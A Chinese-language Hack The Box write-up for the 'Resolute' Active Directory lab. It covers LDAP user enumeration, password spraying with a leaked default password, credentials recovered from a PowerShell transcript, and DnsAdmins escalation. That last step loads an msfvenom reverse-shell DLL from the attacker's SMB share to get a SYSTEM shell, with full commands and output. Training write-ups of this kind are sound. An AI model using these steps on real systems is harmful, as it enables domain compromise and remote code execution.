---
title: HTB-Resolute：从密码喷洒到 DNS 插件劫持
date: 2026-07-01
updated: 2026-07-05
tags:
  - HTB
  - Machine
  - AD
description: 一句话摘要
---
![[file-20260718153500262.png]]

## 一、Nmap

TCP 全端口扫描：

```bash
$ sudo nmap -sS -p- -Pn -n -T4 --min-rate 5000 10.129.96.155 -oA tcp_ports
Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-27 04:19 EDT
Nmap scan report for 10.129.96.155
Host is up (0.0071s latency).
Not shown: 65512 closed tcp ports (reset)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49668/tcp open  unknown
49671/tcp open  unknown
49676/tcp open  unknown
49677/tcp open  unknown
49686/tcp open  unknown
49732/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 10.45 seconds
```

提取开放端口：

```bash
$ cat tcp_ports.nmap | grep -oP '^\d+' | paste -s -d ','
53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49671,49676,49677,49686,49732
```

对开放端口进行详细扫描：

```bash
$ sudo nmap -sC -sV --reason -Pn -n -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49671,49676,49677,49686,49732 10.129.96.155 -oA tcp_ports_detial
Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-27 04:21 EDT
Nmap scan report for 10.129.96.155
Host is up, received user-set (0.0074s latency).

PORT      STATE SERVICE      REASON          VERSION
53/tcp    open  domain       syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-07-27 08:28:27Z)
135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap         syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds syn-ack ttl 127 Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
464/tcp   open  kpasswd5?    syn-ack ttl 127
593/tcp   open  ncacn_http   syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped   syn-ack ttl 127
3268/tcp  open  ldap         syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped   syn-ack ttl 127
5985/tcp  open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       syn-ack ttl 127 .NET Message Framing
47001/tcp open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49671/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49676/tcp open  ncacn_http   syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49686/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49732/tcp open  unknown      syn-ack ttl 127
Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h27m01s, deviation: 4h02m31s, median: 6m59s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-time: 
|   date: 2026-07-27T08:29:16
|_  start_date: 2026-07-27T08:24:10
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Resolute
|   NetBIOS computer name: RESOLUTE\x00
|   Domain name: megabank.local
|   Forest name: megabank.local
|   FQDN: Resolute.megabank.local
|_  System time: 2026-07-27T01:29:19-07:00
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 63.88 seconds
```

从开放的端口情况判断出目标是 AD 中的 DC。

将扫描结果中出现的域名添加到本地 `hosts` 文件中：

```bash
$ echo '10.129.96.155 Resolute.megabank.local megabank.local' | sudo tee -a /etc/hosts
10.129.96.155 Resolute.megabank.local megabank.local
```

`nmap` 针对 smb 服务进行的默认脚本扫描结果中有：

```
authentication_level: user
```

这意味着 SMB 匿名枚举失效，验证：

```bash
$ smbmap -H 10.129.96.155 -u '' -p ''

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB connections(s) and 0 authenticated session(s)
[!] Access denied on 10.129.96.155, no fun for you...
[*] Closed 1 connections
```

## 二、枚举

### 1、SMB

尝试 guest 用户 + 空密码进行 SMB 共享枚举：

```bash
$ smbmap -H 10.129.96.155 -u 'guest' -p ''

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB connections(s) and 0 authenticated session(s)
[!] Access denied on 10.129.96.155, no fun for you...
[*] Closed 1 connections
```

没有结果。

### 2、LDAP

LDAP 匿名查询用户：

```bash
$ netexec ldap 10.129.96.155 -u '' -p '' --users
LDAP        10.129.96.155   389    RESOLUTE         [*] Windows 10 / Server 2016 Build 14393 (name:RESOLUTE) (domain:megabank.local) (signing:None) (channel binding:No TLS cert)
LDAP        10.129.96.155   389    RESOLUTE         [+] megabank.local\:
LDAP        10.129.96.155   389    RESOLUTE         [*] Enumerated 27 domain users: megabank.local
LDAP        10.129.96.155   389    RESOLUTE         -Username-                    -Last PW Set-       -BadPW-  -Description-                     
LDAP        10.129.96.155   389    RESOLUTE         Administrator                 2026-07-27 17:14:04 0        Built-in account for administering the computer/domain
LDAP        10.129.96.155   389    RESOLUTE         Guest                         <never>             0        Built-in account for guest access to the computer/domain
LDAP        10.129.96.155   389    RESOLUTE         DefaultAccount                <never>             0        A user account managed by the system.
LDAP        10.129.96.155   389    RESOLUTE         krbtgt                        2019-09-25 21:29:12 0        Key Distribution Center Service Account
LDAP        10.129.96.155   389    RESOLUTE         ryan                          2026-07-27 17:13:03 0                                          
LDAP        10.129.96.155   389    RESOLUTE         marko                         2019-09-27 21:17:14 0        Account created. Password set to Welcome123!
LDAP        10.129.96.155   389    RESOLUTE         sunita                        2019-12-04 05:26:29 0                                          
LDAP        10.129.96.155   389    RESOLUTE         abigail                       2019-12-04 05:27:30 0                                          
LDAP        10.129.96.155   389    RESOLUTE         marcus                        2019-12-04 05:27:59 0                                          
LDAP        10.129.96.155   389    RESOLUTE         sally                         2019-12-04 05:28:29 0                                          
LDAP        10.129.96.155   389    RESOLUTE         fred                          2019-12-04 05:29:01 0                                          
LDAP        10.129.96.155   389    RESOLUTE         angela                        2019-12-04 05:29:43 0                                          
LDAP        10.129.96.155   389    RESOLUTE         felicia                       2019-12-04 05:30:53 0                                          
LDAP        10.129.96.155   389    RESOLUTE         gustavo                       2019-12-04 05:31:42 0                                          
LDAP        10.129.96.155   389    RESOLUTE         ulf                           2019-12-04 05:32:19 0                                          
LDAP        10.129.96.155   389    RESOLUTE         stevie                        2019-12-04 05:33:13 0                                          
LDAP        10.129.96.155   389    RESOLUTE         claire                        2019-12-04 05:33:44 0                                          
LDAP        10.129.96.155   389    RESOLUTE         paulo                         2019-12-04 05:34:46 0                                          
LDAP        10.129.96.155   389    RESOLUTE         steve                         2019-12-04 05:35:25 0                                          
LDAP        10.129.96.155   389    RESOLUTE         annette                       2019-12-04 05:36:55 0                                          
LDAP        10.129.96.155   389    RESOLUTE         annika                        2019-12-04 05:37:23 0                                          
LDAP        10.129.96.155   389    RESOLUTE         per                           2019-12-04 05:38:12 0                                          
LDAP        10.129.96.155   389    RESOLUTE         claude                        2019-12-04 05:39:56 0                                          
LDAP        10.129.96.155   389    RESOLUTE         melanie                       2026-07-27 17:14:04 0                                          
LDAP        10.129.96.155   389    RESOLUTE         zach                          2019-12-04 18:39:27 0                                          
LDAP        10.129.96.155   389    RESOLUTE         simon                         2019-12-04 18:39:58 0                                          
LDAP        10.129.96.155   389    RESOLUTE         naoki                         2019-12-04 18:40:44 0
```

整理成用户字典：

```bash
$ cat tmp | awk '{print $5}' | rg -vP '^\-' >> users.txt
┌─[VPN]─[10.10.16.64]─[zyf@parrot]─[~/htb_workdir/resolute]
└──╼ [★]$ cat users.txt
Administrator
Guest
DefaultAccount
krbtgt
ryan
marko
sunita
abigail
marcus
sally
fred
angela
felicia
gustavo
ulf
stevie
claire
paulo
steve
annette
annika
per
claude
melanie
zach
simon
naoki
```

在 `marko` 用户的 `Description` 条目暴露了密码：

```
Account created. Password set to Welcome123!
```

但 `marko` 似乎已经改掉了该初始密码：

```bash
$ netexec smb 10.129.96.155 -u 'marko' -p 'Welcome123!'
SMB         10.129.96.155   445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True) (Null Auth:True)
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\marko:Welcome123! STATUS_LOGON_FAILURE
```

这会消耗一次密码尝试，为了避免出现锁号的现象，我打算进行 LDAP 匿名搜索，并在其中找账户锁定的相关条目：

```bash
$ ldapsearch -H ldap://10.129.96.155 -s base namingcontexts -x
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts
#

#
dn:
namingContexts: DC=megabank,DC=local
namingContexts: CN=Configuration,DC=megabank,DC=local
namingContexts: CN=Schema,CN=Configuration,DC=megabank,DC=local
namingContexts: DC=DomainDnsZones,DC=megabank,DC=local
namingContexts: DC=ForestDnsZones,DC=megabank,DC=local

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

```bash
$ ldapsearch -H ldap://10.129.96.155 -b 'DC=megabank,DC=local' -x >> ldapsearch_results

$ cat ldapsearch_results | rg 'lockout' | awk '!seen[$0]++'
lockoutDuration: -18000000000
lockoutThreshold: 0
```

目标未开启账户锁定。

## 三、密码喷洒

毕竟是账号创建时的默认密码，查看是否存在没有改初始凭证的账户：

```bash
$ netexec smb 10.129.96.155 -u users.txt -p 'Welcome123!'
SMB         10.129.96.155   445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True) (Null Auth:True)
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\Administrator:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\Guest:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\DefaultAccount:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\krbtgt:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\ryan:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\marko:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\sunita:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\abigail:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\marcus:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\sally:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\fred:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\angela:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\felicia:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\gustavo:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\ulf:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\stevie:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\claire:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\paulo:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\steve:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\annette:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\annika:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\per:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\claude:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.96.155   445    RESOLUTE         [+] megabank.local\melanie:Welcome123!
```

得到：

```
melanie
Welcome123!
```

并且知道该账户可以登入 WinRM：

```bash
$ netexec winrm 10.129.96.155 -u 'melanie' -p 'Welcome123!'
WINRM       10.129.96.155   5985   RESOLUTE         [*] Windows 10 / Server 2016 Build 14393 (name:RESOLUTE) (domain:megabank.local)
WINRM       10.129.96.155   5985   RESOLUTE         [+] megabank.local\melanie:Welcome123! (Pwn3d!)
```

## 四、melanie shell

通过 `evil-winrm` 工具获得 melanie shell：

```bash
$ evil-winrm -i 10.129.96.155 -u 'melanie' -p 'Welcome123!'

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\melanie\Documents> 
```

在家目录中能看到 User Flag：

```powershell
*Evil-WinRM* PS C:\Users\melanie\Desktop> cat user.txt
9acf***********************
```

在 C 盘根目录中能看到一个非常规目录，即 `PSTranscripts`：

```powershell
*Evil-WinRM* PS C:\> ls -force


    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d--hs-        12/3/2019   6:40 AM                $RECYCLE.BIN
d--hsl        9/25/2019  10:17 AM                Documents and Settings
d-----        9/25/2019   6:19 AM                PerfLogs
d-r---        9/25/2019  12:39 PM                Program Files
d-----       11/20/2016   6:36 PM                Program Files (x86)
d--h--        9/25/2019  10:48 AM                ProgramData
d--h--        12/3/2019   6:32 AM                PSTranscripts
d--hs-        9/25/2019  10:17 AM                Recovery
d--hs-        9/25/2019   6:25 AM                System Volume Information
d-r---        12/4/2019   2:46 AM                Users
d-----        12/4/2019   5:15 AM                Windows
-arhs-       11/20/2016   5:59 PM         389408 bootmgr
-a-hs-        7/16/2016   6:10 AM              1 BOOTNXT
-a-hs-        7/27/2026   1:23 AM      402653184 pagefile.sys
```

其中能找到一个文件：

```bash
*Evil-WinRM* PS C:\PSTranscripts\20191203> ls -force


    Directory: C:\PSTranscripts\20191203


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-arh--        12/3/2019   6:45 AM           3732 PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
```

这是是 PowerShell 的转录功能自动留下的日志文件，其中能看到一条命令：

```powershell
*Evil-WinRM* PS C:\PSTranscripts\20191203> cat PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt

[snip]
PS>CommandInvocation(Invoke-Expression): "Invoke-Expression"
>> ParameterBinding(Invoke-Expression): name="Command"; value="cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
[snip]
```

> PowerShell Transcription 会完整记录用户实际输入/执行的命令行。

它利用凭证信息：

```
username: ryan
password: Serv3r4Admin4cc123!
```

将共享资源 `\\fs01\backups` 映射到了本地 `X` 盘。

## 五、ryan shell

`ryan` 同样具备登入 WinRM 的权限：

```bash
$ netexec winrm 10.129.96.155 -u 'ryan' -p 'Serv3r4Admin4cc123!'
WINRM       10.129.96.155   5985   RESOLUTE         [*] Windows 10 / Server 2016 Build 14393 (name:RESOLUTE) (domain:megabank.local)
WINRM       10.129.96.155   5985   RESOLUTE         [+] megabank.local\ryan:Serv3r4Admin4cc123! (Pwn3d!)
```

通过 `evil-winrm` 获得 Shell：

```bash
$ evil-winrm -i 10.129.96.155 -u 'ryan' -p 'Serv3r4Admin4cc123!'
Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\ryan\Documents>
```

在 Desktop 目录中能找到一份笔记：

```powershell
*Evil-WinRM* PS C:\Users\ryan\Desktop> ls -force


    Directory: C:\Users\ryan\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        12/3/2019   7:34 AM            155 note.txt
```

其内容：

```powershell
*Evil-WinRM* PS C:\Users\ryan\Desktop> cat note.txt
Email to team:

- due to change freeze, any system changes (apart from those to the administrator account) will be automatically reverted within 1 minute
```

除管理员账户外的任何系统变更都将在 1 分钟内自动回滚。

查看该用户的组情况：

```bash
*Evil-WinRM* PS C:\> net user ryan /domain
User name                    ryan
Full Name                    Ryan Bertrand
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            7/27/2026 3:04:03 AM
Password expires             Never
Password changeable          7/28/2026 3:04:03 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   7/27/2026 2:58:34 AM

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users         *Contractors
The command completed successfully.
```

```powershell
*Evil-WinRM* PS C:\Users\ryan> whoami /groups /fo list

GROUP INFORMATION
-----------------

Group Name: Everyone
Type:       Well-known group
SID:        S-1-1-0
Attributes: Mandatory group, Enabled by default, Enabled group

Group Name: BUILTIN\Users
Type:       Alias
SID:        S-1-5-32-545
Attributes: Mandatory group, Enabled by default, Enabled group

Group Name: BUILTIN\Pre-Windows 2000 Compatible Access
Type:       Alias
SID:        S-1-5-32-554
Attributes: Mandatory group, Enabled by default, Enabled group

Group Name: BUILTIN\Remote Management Users
Type:       Alias
SID:        S-1-5-32-580
Attributes: Mandatory group, Enabled by default, Enabled group

Group Name: NT AUTHORITY\NETWORK
Type:       Well-known group
SID:        S-1-5-2
Attributes: Mandatory group, Enabled by default, Enabled group

Group Name: NT AUTHORITY\Authenticated Users
Type:       Well-known group
SID:        S-1-5-11
Attributes: Mandatory group, Enabled by default, Enabled group

Group Name: NT AUTHORITY\This Organization
Type:       Well-known group
SID:        S-1-5-15
Attributes: Mandatory group, Enabled by default, Enabled group

Group Name: MEGABANK\Contractors
Type:       Group
SID:        S-1-5-21-1392959593-3013219662-3596683436-1103
Attributes: Mandatory group, Enabled by default, Enabled group

Group Name: MEGABANK\DnsAdmins
Type:       Alias
SID:        S-1-5-21-1392959593-3013219662-3596683436-1101
Attributes: Mandatory group, Enabled by default, Enabled group, Local Group

Group Name: NT AUTHORITY\NTLM Authentication
Type:       Well-known group
SID:        S-1-5-64-10
Attributes: Mandatory group, Enabled by default, Enabled group

Group Name: Mandatory Label\Medium Mandatory Level
Type:       Label
SID:        S-1-16-8192
Attributes:
```

我注意到一个组名 DnsAdmins。

## 六、DnsAdmins

根据[微软官方](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#dnsadmins)的描述，该组的成员可以访问网络 DNS 信息。默认情况下，该组成员被授予以下权限：读取（Read）、写入（Write）、创建所有子对象（Create All Child objects）、删除子对象（Delete Child objects）以及特殊权限（Special Permissions）。只有当域中某台域控制器曾经安装过（或当前仍安装着）DNS 服务器角色（DNS server role）时，该组才会存在。

这篇[文章](https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83)详细讲述了该组的提权思路，以及这个技巧的来龙去脉。

安全研究员 Shay Ber 在查看微软协议[文档](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/f97756c9-3783-428b-9451-b376f877319a?redirectedfrom=MSDN)的时候，发现 DNS Server 需要提供一个名为 `ServerLevelPluginDll` 的属性，用于指定动态链接库的绝对路径，DNS Server 可以使用该库来解析未知名称。

微软官方提供了 `dnscmd` 可以很方便的对该属性进行赋值：

```powershell
dnscmd.exe /config /serverlevelplugindll \\path\to\dll
```

而且，研究员通过逆向分析验证了 DLL 路径不会被校验。

因此，可以指定一个恶意 DLL 来实现提权。

> DNS Server 通常由高权限账户运行。

用 `msfvenom` 生成恶意 DLL：

```bash
$ msfvenom -p windows/x64/shell_reverse_tcp -f dll LHOST=10.10.16.64 LPORT=4444 -o rev.dll
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of dll file: 9216 bytes
Saved as: rev.dll
```

> 选取 payload 的时候，注意选择正确的架构，以及选择不分段的 payload（选 `shell_reverse` 而不是 `shell/reverse`），这点在 Beyond Root 中会提到。

在有恶意 DLL 的目录上运行 SMB Server：

```bash
$ sudo /home/zyf/.local/bin/smbserver.py share . -smb2support

Impacket v0.14.0.dev0+20260715.13927.137441c1 - Copyright Fortra, LLC and its affiliated companies
```

在本地监听 4444 端口：

```bash
$ nc -lvnp 4444
Listening on 0.0.0.0 4444
```

使用 `dnscmd` 给 `serverlevelplugindll` 属性赋值：

```powershell
*Evil-WinRM* PS C:\Users\ryan> dnscmd.exe /config /serverlevelplugindll \\10.10.16.64\share\rev.dll

Registry property serverlevelplugindll successfully reset.
Command completed successfully.
```

> 这里选择“指定远端 SMB 共享文件”而不是直接上传到本地的原因：若 DLL 有误，本地直接重新生成更方便，而且还不用在目标服务器上落地恶意文件，更符合 OPSEC。

并重启 DNS 服务：

```powershell
*Evil-WinRM* PS C:\Users\ryan> sc.exe stop dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 3  STOP_PENDING
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
*Evil-WinRM* PS C:\Users\ryan> sc.exe start dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 3196
        FLAGS              :
```

返回了 SYSTEM Shell：

```bash
$ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.96.155 55341
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

在 Administrator 的 Desktop 目录中能找到 Root Flag：

```powershell
c:\Users\Administrator\Desktop>type root.txt
type root.txt
dd1a*********************
```

## 七、Beyond Root

### 1、sc in evil-winrm

在 `evil-winrm` 中，`sc` 是 `Set-Content`：

```powershell
*Evil-WinRM* PS C:\Users\ryan> get-command sc

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Alias           sc -> Set-Content
```

而正常 Powershell 中的 `sc` 才代表 `sc.exe`：

```powershell
get-Command sc

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Application     sc.exe                                             10.0.2610… C:\Windows\system32\sc.exe
```

这也是为什么重启 DNS 服务需要用全称而不是缩写。

### 2、恶意 DLL

在那篇安全研究员的文章中，提到恶意 DLL 需要满足：

- DLL 被正确加载（路径）
- DLL 中包含导出函数（`DnsPluginInitialize`、`DnsPluginCleanup` 或 `DnsPluginQuery`）

但是我通过反编译 `msfvenom` 生成的 DLL 文件，发现其中并没有导出函数：

```bash
$ r2 -A evil.dll
WARN: Relocs has not been applied. Please use `-e bin.relocs.apply=true` or `-e bin.cache=true` next time
INFO: Analyze all flags starting with sym. and entry0 (aa)
INFO: Analyze imports (af@@@i)
INFO: Analyze entrypoint (af@ entry0)
INFO: Analyze symbols (af@@@s)
INFO: Running plugin pre-analysis hooks
INFO: Analyze all functions arguments/locals (afva@@F)
INFO: Analyze function calls (aac)
INFO: Analyze len bytes of instructions for references (aar)
INFO: Finding and parsing C++ vtables (avrr)
INFO: Analyzing methods (af @@ method.*)
INFO: Recovering local variables (afva@@@F)
INFO: Type matching analysis for all functions (aaft)
INFO: Propagate noreturn information (aanr)
INFO: Use -AA or aaaa to perform additional experimental analysis

[0x10001170]> iE
nth paddr vaddr bind type size lib name demangled
―――――――――――――――――――――――――――――――――――――――――――――――――
```

这会导致 DNS 卡住或者崩溃。

但是，DLL 中的脚本会照常运行，这也是“反弹 Shell 成功”的原因。

至于上面提到的“为什么不能用分阶段的 payload”，也是因为恶意 DLL 不包含导出函数。

DNS Server 进程随时可能崩溃，导致第一阶段的 payload 上传之后，无法继续拉取后阶段的 payload 从而导致反弹 Shell 失败。